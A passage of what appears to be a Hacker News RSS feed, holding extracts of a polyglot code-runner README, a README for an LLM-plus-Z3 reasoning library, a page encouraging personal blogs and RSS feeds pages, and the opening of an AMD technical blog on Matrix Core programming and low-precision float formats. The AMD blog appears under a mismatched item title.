    &lt;p&gt;This architecture keeps the core lightweight while making it easy to add new runtimes or swap implementations.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;run&lt;/code&gt; supports 25+ languages:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Category&lt;/cell&gt;
        &lt;cell role="head"&gt;Languages &amp;amp; aliases&lt;/cell&gt;
        &lt;cell role="head"&gt;Toolchain expectations&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Scripting &amp;amp; shells&lt;/cell&gt;
        &lt;cell&gt;Bash (&lt;code&gt;bash&lt;/code&gt;), Python (&lt;code&gt;py&lt;/code&gt;, &lt;code&gt;python&lt;/code&gt;), Ruby (&lt;code&gt;rb&lt;/code&gt;, &lt;code&gt;ruby&lt;/code&gt;), PHP (&lt;code&gt;php&lt;/code&gt;), Perl (&lt;code&gt;perl&lt;/code&gt;), Lua (&lt;code&gt;lua&lt;/code&gt;), R (&lt;code&gt;r&lt;/code&gt;), Elixir (&lt;code&gt;ex&lt;/code&gt;, &lt;code&gt;elixir&lt;/code&gt;)&lt;/cell&gt;
        &lt;cell&gt;Matching interpreter on &lt;code&gt;PATH&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Web &amp;amp; typed scripting&lt;/cell&gt;
        &lt;cell&gt;JavaScript (&lt;code&gt;js&lt;/code&gt;, &lt;code&gt;node&lt;/code&gt;), TypeScript (&lt;code&gt;ts&lt;/code&gt;, &lt;code&gt;deno&lt;/code&gt;), Dart (&lt;code&gt;dart&lt;/code&gt;), Swift (&lt;code&gt;swift&lt;/code&gt;), Kotlin (&lt;code&gt;kt&lt;/code&gt;, &lt;code&gt;kotlin&lt;/code&gt;)&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;node&lt;/code&gt;, &lt;code&gt;deno&lt;/code&gt;, &lt;code&gt;dart&lt;/code&gt;, &lt;code&gt;swift&lt;/code&gt;, &lt;code&gt;kotlinc&lt;/code&gt; + JRE&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Systems &amp;amp; compiled&lt;/cell&gt;
        &lt;cell&gt;C (&lt;code&gt;c&lt;/code&gt;), C++ (&lt;code&gt;cpp&lt;/code&gt;, &lt;code&gt;cxx&lt;/code&gt;), Rust (&lt;code&gt;rs&lt;/code&gt;, &lt;code&gt;rust&lt;/code&gt;), Go (&lt;code&gt;go&lt;/code&gt;), Zig (&lt;code&gt;zig&lt;/code&gt;), Nim (&lt;code&gt;nim&lt;/code&gt;), Haskell (&lt;code&gt;hs&lt;/code&gt;, &lt;code&gt;haskell&lt;/code&gt;), Crystal (&lt;code&gt;cr&lt;/code&gt;, &lt;code&gt;crystal&lt;/code&gt;), C# (&lt;code&gt;cs&lt;/code&gt;, &lt;code&gt;csharp&lt;/code&gt;), Java (&lt;code&gt;java&lt;/code&gt;), Julia (&lt;code&gt;jl&lt;/code&gt;, &lt;code&gt;julia&lt;/code&gt;)&lt;/cell&gt;
        &lt;cell&gt;Respective compiler / toolchain&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Real programs live under the &lt;code&gt;examples/&lt;/code&gt; tree—each language has a &lt;code&gt;hello&lt;/code&gt; and a &lt;code&gt;progress&lt;/code&gt; scenario. The headers document expected output so you can diff your toolchain.&lt;/p&gt;
    &lt;code&gt;run examples/rust/hello.rs
run examples/typescript/progress.ts
run examples/python/counter.py&lt;/code&gt;
    &lt;p&gt;Being inside REPL we can use the ff commands&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Command&lt;/cell&gt;
        &lt;cell role="head"&gt;Purpose&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:help&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;List available meta commands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:languages&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show detected engines and status&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;:lang &amp;lt;id&amp;gt;&lt;/code&gt; or &lt;code&gt;:&amp;lt;alias&amp;gt;&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Switch the active language (&lt;code&gt;:py&lt;/code&gt;, &lt;code&gt;:go&lt;/code&gt;, …)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:detect on/off/toggle&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Control snippet language auto-detection&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:load path/to/file&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Execute a file inside the current session&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:reset&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Clear the accumulated session state&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;&lt;code&gt;:exit&lt;/code&gt; / &lt;code&gt;:quit&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Leave the REPL&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Apache 2.0. See LICENSE for details.&lt;/p&gt;
    &lt;p&gt;Built with ❤️ in Rust. If &lt;code&gt;run&lt;/code&gt; unblocks your workflow, star the repo and share it with other polyglot hackers.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45475528</guid><pubDate>Sat, 04 Oct 2025 18:34:13 +0000</pubDate></item><item><title>ProofOfThought: LLM-based reasoning using Z3 theorem proving</title><link>https://github.com/DebarghaG/proofofthought</link><description>&lt;doc fingerprint="880be56c94434dea"&gt;
  &lt;main&gt;
    &lt;p&gt;LLM-based reasoning using Z3 theorem proving.&lt;/p&gt;
    &lt;code&gt;from openai import OpenAI
from z3dsl.reasoning import ProofOfThought

client = OpenAI(api_key="...")
pot = ProofOfThought(llm_client=client)

result = pot.query("Would Nancy Pelosi publicly denounce abortion?")
print(result.answer)  # False&lt;/code&gt;
    &lt;code&gt;from z3dsl.reasoning import EvaluationPipeline

evaluator = EvaluationPipeline(pot, output_dir="results/")
result = evaluator.evaluate(
    dataset="strategyqa_train.json",
    max_samples=10
)
print(f"Accuracy: {result.metrics.accuracy:.2%}")&lt;/code&gt;
    &lt;code&gt;pip install z3-solver openai scikit-learn numpy&lt;/code&gt;
    &lt;p&gt;The system has two layers:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;High-level API (&lt;code&gt;z3dsl.reasoning&lt;/code&gt;) - Simple Python interface for reasoning tasks&lt;/item&gt;
      &lt;item&gt;Low-level DSL (&lt;code&gt;z3dsl&lt;/code&gt;) - JSON-based Z3 theorem prover interface&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Most users should use the high-level API.&lt;/p&gt;
    &lt;p&gt;See &lt;code&gt;examples/&lt;/code&gt; directory for complete examples including Azure OpenAI support.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45475529</guid><pubDate>Sat, 04 Oct 2025 18:34:23 +0000</pubDate></item><item><title>Blog Feeds</title><link>https://blogfeeds.net</link><description>&lt;doc fingerprint="779f1fb99e6586b5"&gt;
  &lt;main&gt;
    &lt;p&gt;Tired of social media?&lt;/p&gt;
    &lt;p&gt;Keep doom scrolling through addicting feeds?&lt;/p&gt;
    &lt;p&gt;Miss the days when the web was just about connecting with people and their thoughts or ideas?&lt;/p&gt;
    &lt;p&gt;We believe there's an answer to that problem, and it's called&lt;/p&gt;
    &lt;p&gt;Starting a blog is actually a lot simpler than what you're probably thinking. This doesn't have to be some well polished highly viewed monetization machine, or even something professional or formal. It's just a simple website where you can casually talk about whatever you want to talk about! It can be long, short, a list of small things, or just a quote. It should be how you talk with other people in your own life, or how you communicate with the outside world. It should be you on a page. Here's a few places you can make a blog that are RSS enabled:&lt;/p&gt;
    &lt;p&gt;RSS is actually already familiar to you if you have ever subscribed to a newsletter. You put your email into someoneâs website, and when they have updates, they send you emails to your inbox so you can stay in the loop. In the case of RSS, you have a dedicated app, called an RSS reader usually, and you can put in someoneâs website into the app to subscribe. When they make a new post, just open your news reader app, and their posts will be retrieved and ready to read. Some reader apps even let you make folders and tags to organize blogs you are subscribed to, similar to how an email app lets you make folders to sort mail. Would highly recommend trying a few of the apps or services and seeing which works best!&lt;/p&gt;
    &lt;p&gt;This takes us to our final point: Feeds. You can probably get away with just the first two items and then sharing it with people you already know, but what about meeting or talking to people you don't know? That's where Feeds come in. The idea is to create another page on your blog that has all the RSS feeds you're subscribed to. By keeping this public and always up to date, someone can visit your page, find someone new and follow them. Perhaps that person also has a feeds page, and the cycle continues until there is a natural and organic network of people all sharing with each other. So if you have a blog, consider making a feeds page and sharing it! If your RSS reader supports OPML file exports and imports, perhaps you can share that file as well to make it easier to share your feeds.&lt;/p&gt;
    &lt;p&gt;Here's an example Feeds Page which should help get the idea across!&lt;/p&gt;
    &lt;p&gt;The best part about blog feeds? It's just an idea. There's no central authority. There's no platform. No massive tech giant trying to take your data. It's just you, basic web standards, and the people you care about.&lt;/p&gt;
    &lt;p&gt;Made by Steve&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45475808</guid><pubDate>Sat, 04 Oct 2025 19:08:46 +0000</pubDate></item><item><title>$912 energy independence without red tape</title><link>https://sunboxlabs.com/</link><description>&lt;doc fingerprint="179c1252016d1d30"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Matrix Core Programming on AMD CDNA3 and CDNA4 architecture&lt;/head&gt;
    &lt;p&gt;TL;DR In this blog post, we walk through how to use Matrix Cores in HIP kernels, with a focus on low-precision data types such as FP16, FP8, and FP4, as well as the new family of Matrix Core instructions with exponent block scaling introduced in the AMD CDNA™4 architecture. Through code examples and illustrations, we provide the necessary knowledge to start programming Matrix Cores, covering modern low-precision floating-point types, the Matrix Core compiler intrinsics, and the data layouts required by the Matrix Core instructions. The blog post is also available on ROCm Blogs.&lt;/p&gt;
    &lt;head rend="h2"&gt;1. Matrix Cores&lt;/head&gt;
    &lt;p&gt;Matrix multiplication is an essential part of AI and HPC workloads. The AMD CDNA™ architecture features special-purpose hardware, the Matrix Cores, to accelerate matrix fused-multiply-add (MFMA) operations defined as &lt;code&gt;D:=A*B+C&lt;/code&gt;. Please note that MFMA instructions are often used to update a matrix in-place (=accumulation) so that &lt;code&gt;D=C&lt;/code&gt; and &lt;code&gt;C:=A*B+C&lt;/code&gt;. The matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt; are called input matrices, while the matrix &lt;code&gt;D&lt;/code&gt; is referred to as the output matrix or accumulator.&lt;/p&gt;
    &lt;p&gt;The performance gains from using Matrix Cores are especially significant in mixed-precision mode, where the input matrices use lower-precision data types instead of FP32. The output matrix, however, is stored in FP32 to minimize accuracy loss during accumulation. The tables below show the theoretical peak performance of Matrix Cores with different input data types on both AMD CDNA™3 and AMD CDNA™4 architectures. On the AMD Instinct™ MI325X, using FP16 input matrices delivers nearly an 8x performance increase compared to single-precision, with only minimal accuracy loss. Switching to FP8 further doubles the performance providing a 16x increase when compared to FP32. The AMD CDNA™4 architecture further improves Matrix Core performance, delivering up to 2x higher throughput for FP16 and FP8 compared to the AMD CDNA™3 architecture. In addition, AMD CDNA™4 introduces new low-precision data types such as FP6 and FP4, enabling up to 64x performance gain relative to FP32. Please refer to the AMD CDNA™3 and AMD CDNA™4 white papers for detailed architecture specifications.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;AMD Instinct™ MI325X (CDNA™3)&lt;/cell&gt;
        &lt;cell role="head"&gt;Speedup vs. FP32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP64&lt;/cell&gt;
        &lt;cell&gt;163.4 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP32&lt;/cell&gt;
        &lt;cell&gt;163.4 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP16&lt;/cell&gt;
        &lt;cell&gt;1307.4 TF&lt;/cell&gt;
        &lt;cell&gt;~8x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Matrix FP8&lt;/cell&gt;
        &lt;cell&gt;2614.9 TF&lt;/cell&gt;
        &lt;cell&gt;~16x&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;AMD Instinct™ MI355X (CDNA™4)&lt;/cell&gt;
        &lt;cell role="head"&gt;Speedup vs. FP32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP64&lt;/cell&gt;
        &lt;cell&gt;78.6 TF&lt;/cell&gt;
        &lt;cell&gt;~0.5x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP32&lt;/cell&gt;
        &lt;cell&gt;157.3 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP16&lt;/cell&gt;
        &lt;cell&gt;2.5 PF&lt;/cell&gt;
        &lt;cell&gt;~16x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP8&lt;/cell&gt;
        &lt;cell&gt;5 PF&lt;/cell&gt;
        &lt;cell&gt;~32x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP6&lt;/cell&gt;
        &lt;cell&gt;10 PF&lt;/cell&gt;
        &lt;cell&gt;~64x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Matrix FP4&lt;/cell&gt;
        &lt;cell&gt;10 PF&lt;/cell&gt;
        &lt;cell&gt;~64x&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;2. Low-Precision Floating-Point Types&lt;/head&gt;
    &lt;p&gt;A binary representation of a floating-point number consists of &lt;code&gt;n&lt;/code&gt; bits, where &lt;code&gt;m&lt;/code&gt; of &lt;code&gt;n&lt;/code&gt; bits represent the mantissa, 1 bit determines the sign and &lt;code&gt;n-m-1&lt;/code&gt; bits represent the exponent. The following image illustrates the binary format of a floating-point number and how the exponent and mantissa are calculated based on its binary representation.&lt;/p&gt;
    &lt;p&gt;Figure 1: Binary representation of a floating-point number.&lt;/p&gt;
    &lt;p&gt;Floating-point types are characterized by the number of bits used for the exponent and for the mantissa. Increasing the exponent width extends the range of representable values, while increasing the mantissa width improves precision. Since all floating-point types include the sign bit, a shorthand notation typically specifies only the exponent and mantissa widths. For example, the E4M3 type is an 8-bit floating-point type with 4-bit exponent and 3-bit mantissa. Additionally, a floating-point type is specified by exponent bias - a number that is subtracted from the exponent during conversion from binary format to real value. Given the exponent width, mantissa width, and exponent bias, one can convert the binary representation of a floating-point type (except E8M0) into its real value using the following equation:&lt;/p&gt;
    &lt;p&gt;Figure 2: Conversion to real value from binary representation for floating-point numbers.&lt;/p&gt;
    &lt;p&gt;Please note that the equation takes different forms depending on whether the exponent is zero or not. Often, certain exponent and mantissa values are reserved for special values (e.g. &lt;code&gt;NaN&lt;/code&gt;, &lt;code&gt;Infinity&lt;/code&gt;), which limits the range of representable real numbers. For example, the FP16 type has 5-bit exponent with a nominal range of &lt;code&gt;[0, 1, ... 2^5-1] = [0, 1, ... 31]&lt;/code&gt;. However, the exponent value &lt;code&gt;E = 31&lt;/code&gt; is reserved for &lt;code&gt;NaN&lt;/code&gt; (if the mantissa &lt;code&gt;M != 0&lt;/code&gt;) and &lt;code&gt;infinity&lt;/code&gt; (if the mantissa &lt;code&gt;M = 0&lt;/code&gt;). Therefore, the largest exponent value that can represent a real number is &lt;code&gt;E = 30&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The following table summarizes low-precision types commonly used in modern AI/ML workloads:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="7"&gt;
        &lt;cell role="head"&gt;Width&lt;/cell&gt;
        &lt;cell role="head"&gt;Shorthand&lt;/cell&gt;
        &lt;cell role="head"&gt;Exp. bias&lt;/cell&gt;
        &lt;cell role="head"&gt;Range&lt;/cell&gt;
        &lt;cell role="head"&gt;Zero&lt;/cell&gt;
        &lt;cell role="head"&gt;NaN&lt;/cell&gt;
        &lt;cell role="head"&gt;Infinity&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;16-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M10 (FP16)&lt;/cell&gt;
        &lt;cell&gt;15&lt;/cell&gt;
        &lt;cell&gt;±65504&lt;/cell&gt;
        &lt;cell&gt;S 00000 0000000000&lt;/cell&gt;
        &lt;cell&gt;S 11111 xxxxxxxxxx&lt;/cell&gt;
        &lt;cell&gt;S 11111 0000000000&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E8M7 (BF16)&lt;/cell&gt;
        &lt;cell&gt;127&lt;/cell&gt;
        &lt;cell&gt;±3.3895 * 10^38&lt;/cell&gt;
        &lt;cell&gt;S 00000000 0000000&lt;/cell&gt;
        &lt;cell&gt;S 11111111 xxxxxxx&lt;/cell&gt;
        &lt;cell&gt;S 11111111 0000000&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;8-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E4M3FN (FP8, OCP)&lt;/cell&gt;
        &lt;cell&gt;7&lt;/cell&gt;
        &lt;cell&gt;±448&lt;/cell&gt;
        &lt;cell&gt;S 0000 000&lt;/cell&gt;
        &lt;cell&gt;S 1111 111&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E4M3FNUZ (FP8)&lt;/cell&gt;
        &lt;cell&gt;8&lt;/cell&gt;
        &lt;cell&gt;±240&lt;/cell&gt;
        &lt;cell&gt;0 0000 000&lt;/cell&gt;
        &lt;cell&gt;1 0000 000&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M2 (BF8, OCP)&lt;/cell&gt;
        &lt;cell&gt;15&lt;/cell&gt;
        &lt;cell&gt;±57344&lt;/cell&gt;
        &lt;cell&gt;S 00000 00&lt;/cell&gt;
        &lt;cell&gt;S 11111 {01, 10 11}&lt;/cell&gt;
        &lt;cell&gt;S 11111 00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M2FNUZ (BF8)&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
        &lt;cell&gt;±57344&lt;/cell&gt;
        &lt;cell&gt;0 00000 00&lt;/cell&gt;
        &lt;cell&gt;S 00000 00&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E8M0&lt;/cell&gt;
        &lt;cell&gt;127&lt;/cell&gt;
        &lt;cell&gt;2^(±127)&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;11111111&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;6-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E2M3&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;±7.5&lt;/cell&gt;
        &lt;cell&gt;S 00 000&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E3M2 (BF6)&lt;/cell&gt;
        &lt;cell&gt;3&lt;/cell&gt;
        &lt;cell&gt;±28&lt;/cell&gt;
        &lt;cell&gt;S 000 00&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;4-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;E2M1 (FP4)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;±6&lt;/cell&gt;
        &lt;cell&gt;S 00 0&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Please note that the E4M3 type has two variants: E4M3FN and E4M3FNUZ. Both E4M3FN and E4M3FNUZ use 4 bits for the exponent and 3 bits for the mantissa. They use different exponent biases and differ in the special values they can represent. Neither variant supports infinities, which is why their notations include FN (FiNite). However, E4M3FN supports &lt;code&gt;+0&lt;/code&gt;, &lt;code&gt;-0&lt;/code&gt;, &lt;code&gt;+NaN&lt;/code&gt; and &lt;code&gt;-Nan&lt;/code&gt;, while E4M3FNUZ supports only &lt;code&gt;+0&lt;/code&gt; and &lt;code&gt;NaN&lt;/code&gt;, hence &lt;code&gt;UZ&lt;/code&gt; (Unsigned Zero). The image below demonstrates how to convert a binary sequence into a real value, using E4M3FNUZ type as an example:&lt;/p&gt;
    &lt;p&gt;Figure 3: E4M3FNUZ encoding details.&lt;/p&gt;
    &lt;p&gt;FP8 types are divided into E4M3 and E5M2 formats. The E5M2 format is sometimes referred to as BF8, similar to BF16, where exponent width is larger compared to FP16. Similar to E4M3, E5M2 is further subdivided into two variants: E5M2 (OCP) and E5M2FNUZ. The AMD CDNA™3 architecture uses FNUZ variants for both E4M3 and E5M2, whereas the CDNA™4 architecture uses E4M3FN and E5M2 (OCP) variants. E4M3FN and E5M2 are standardized formats defined by the Open Compute Project (OCP). For detailed specifications, see the OCP Microscaling Formats (MX) Specification and the ONNX documentation. For visualization of FP8 values and their binary representations please refer to the FP8 Data table. Additionally, see the chapter “Low-precision floating-point types” in the AMD ROCm™ documentation for details on using low-precision types in HIP.&lt;/p&gt;
    &lt;p&gt;There is a special 8-bit format, E8M0, which is not used as a standard element data type but instead serves as a scale factor for microscaling types and block-scaled MFMA operations (discussed later in this article). Its value is calculated according to the equation below:&lt;/p&gt;
    &lt;p&gt;Figure 4: E8M0 encoding details.&lt;/p&gt;
    &lt;p&gt;The exponent value &lt;code&gt;E = 255&lt;/code&gt; is reserved for &lt;code&gt;NaN&lt;/code&gt; values, limiting the range of representable real numbers to &lt;code&gt;[2^-127 ... 2^127]&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Similar to FP8, FP6 has two formats: E2M3 and E3M2. The latter, E3M2, is often referred to as BF6 due to its larger exponent width compared to E2M3.&lt;/p&gt;
    &lt;head rend="h2"&gt;3. Matrix fused-multiply-add (MFMA) Instructions&lt;/head&gt;
    &lt;p&gt;The AMD CDNA™3 and CDNA™4 architectures support a variety of MFMA operations, which are characterized by the matrix dimensions &lt;code&gt;M&lt;/code&gt;, &lt;code&gt;N&lt;/code&gt;, &lt;code&gt;K&lt;/code&gt; and the data type of input/output matrices. The following table lists all available floating-point MFMA instructions for the AMD CDNA™3 and CDNA™4 architectures. As can be seen from the table, the AMD CDNA™4 architecture extends the set of available MFMA instructions by adding new FP16/BF16 instructions with larger matrix dimensions. Furthermore, it introduces FP6/FP4 data types and provides a completely new set of FP8/FP6/FP4 instructions where the types can be independently used for the matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt;. Finally, the AMD CDNA™4 architecture enables MFMA with block exponent scaling.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Type (C,D) ← (A,B)&lt;/cell&gt;
        &lt;cell role="head"&gt;MxNxK (CDNA™3)&lt;/cell&gt;
        &lt;cell role="head"&gt;MxNxK (CDNA™4)&lt;/cell&gt;
        &lt;cell role="head"&gt;Cycles&lt;/cell&gt;
        &lt;cell role="head"&gt;Note&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP64 ← FP64&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP32&lt;/cell&gt;
        &lt;cell&gt;32x32x2&lt;/cell&gt;
        &lt;cell&gt;32x32x2&lt;/cell&gt;
        &lt;cell&gt;64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP16 (BF16)&lt;/cell&gt;
        &lt;cell&gt;32x32x8&lt;/cell&gt;
        &lt;cell&gt;32x32x8&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
        &lt;cell&gt;Both A and B are either FP16 or BF16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;16x16x16&lt;/cell&gt;
        &lt;cell&gt;16x16x16&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP8&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
        &lt;cell&gt;FP8 (E4M3) or BF8 (E5M2) can be used independently for A and B&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP8/FP6/FP4&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x128&lt;/cell&gt;
        &lt;cell&gt;16 or 32&lt;/cell&gt;
        &lt;cell&gt;FP4, FP6 or FP8 can be used independently for A and B. Larger cycle count if either matrix A or B is FP8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x64&lt;/cell&gt;
        &lt;cell&gt;32 or 64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← MXFP8/MXFP6/MXFP4&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x128&lt;/cell&gt;
        &lt;cell&gt;16 or 32&lt;/cell&gt;
        &lt;cell&gt;FP4, FP6 or FP8 can be used independently for A and B. Larger cycle count if either matrix A or B is FP8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x64&lt;/cell&gt;
        &lt;cell&gt;32 or 64&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Please note that the table lists only floating-point type MFMA instructions with batch size = 1. In addition to them, the AMD CDNA™3 and CDNA™4 architectures support batched MFMA operations, where multiple output matrices are computed in parallel. These instructions are not covered in this article. See the Chapter 7 “Matrix Arithmetic Instructions” in the AMD CDNA™3 and AMD CDNA™4 ISA reference guides for the full list of available MFMA instructions.&lt;/p&gt;
    &lt;p&gt;The table above specifies cycle count for each MFMA operation. Given a known cycle count, one can estimate theoretical peak performance in TFLOP/s of corresponding MFMA operation using the formula below:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;
